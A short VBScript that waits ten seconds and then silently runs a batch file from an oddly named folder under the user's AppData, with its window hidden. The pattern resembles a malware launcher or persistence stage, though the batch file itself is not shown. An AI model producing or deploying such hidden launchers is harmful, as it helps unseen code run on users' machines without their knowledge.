wscript.sleep(10000)
Set oWShell = CreateObject("Wscript.Shell") 
oWShell.Run """%appdata%\msrisitas\main.bat""", 0, False 
Set oWSHell = Nothing